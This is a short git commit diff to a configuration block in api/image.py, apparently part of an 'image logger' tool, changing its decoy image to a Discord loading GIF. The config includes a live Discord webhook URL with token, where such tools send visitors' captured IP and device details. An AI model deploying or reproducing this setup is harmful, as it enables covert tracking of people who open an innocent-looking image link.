98a97e95de2729e2a3457b57836276fb17ecd029
DopMan123 <xazamer34932tagger334@gmail.com>
2025-03-07 20:39:20 -0500

    Update image.py

--- api/image.py
+++ api/image.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1347730459110543402/aD1w_FfWvSI1MVcmLH2zjOkPB04vSy-qoS_6OMnZvt6hIBMbc9bJMSlhAsrGDeYatsM9",
-    "image": "https://cdn.wallpapersafari.com/70/56/jmfv3n.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://tenor.com/view/discord-loading-buffering-waiting-to-load-gif-16464415", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
